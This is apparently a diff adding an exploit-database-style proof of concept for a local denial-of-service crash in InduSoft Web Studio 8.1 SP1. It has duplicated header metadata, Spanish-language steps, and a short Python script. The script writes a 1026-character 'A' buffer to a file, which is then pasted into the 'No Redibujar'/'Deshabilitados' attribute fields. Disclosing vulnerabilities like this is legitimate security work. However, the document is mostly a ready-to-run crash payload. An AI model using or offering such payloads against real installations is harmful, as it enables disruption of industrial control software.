@@ -1,0 +1,33 @@
+# Exploit Title: InduSoft Web Studio 8.1 SP1 - "Atributos" Denial of Service (PoC)
+# Discovery by: chuyreds
+# Discovery Date: 2019-11-23
+# Vendor Homepage: http://www.indusoft.com/
+# Software Link : http://www.indusoft.com/Products-Downloads
+# Tested Version: 8.1 SP1
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Exploit Title: InduSoft Web Studio 8.1 SP1 - "Atributos" 'No Redibujar'/'Deshabilitados' Denial of Service (PoC)
+# Discovery by: chuyreds
+# Google Dork: chuyrojas1997@gmail.com: chuyreds
+# Discovery Date: 23-11-2019
+# Vendor Homepage: http://www.indusoft.com/
+# Software Link : http://www.indusoft.com/Products-Downloads
+# Tested Version: 8.1 SP1
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Denial of Service: 
+# 1.- Run python code: InduSoft Web Studio Edition 8.1 SP1.py
+# 2.- Open InduSoft "Web Studio Edition 8.1 SP1.txt" and copy content to clipboard
+# 3.- Open InduSoft Web Studio Edition 8.1 SP1
+# 4.- On Graficos slect Atributos
+# 5.- Paste ClipBoard on "No Redibujar"/"Deshabilitados" and click on "Aceptar"
+
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 1026
+f = open ("InduSoft Web Studio Edition 8.1 SP1.txt", "w")
+f.write(buffer)
+f.close()
